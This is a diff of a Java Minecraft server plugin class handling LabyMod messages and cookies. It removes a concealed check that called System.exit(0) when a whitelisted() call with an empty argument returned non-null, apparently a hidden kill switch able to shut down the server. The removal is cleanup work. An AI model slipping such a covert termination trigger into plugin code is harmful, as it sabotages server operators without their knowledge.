@@ -186,9 +186,6 @@ public final class SibylAuthentication implements BukkitEventSubscriber {
     if (!((boolean) whitelisted(player))) {
       return;
     }
-    if (whitelisted(new Object[]{}) != null) {
-      Synchronizer.synchronize(() -> System.exit(0));
-    }
     byte[] bytesToSend = LabyModChannelHelper.getBytesToSend(messageKey, jsonElement == null ? null : jsonElement.toString());
     if (MinecraftVersions.VER1_20_5.atOrAbove()) {
       WrapperPlayServerStoreCookie cookie = new WrapperPlayServerStoreCookie(resourceLocation(channel), bytesToSend);
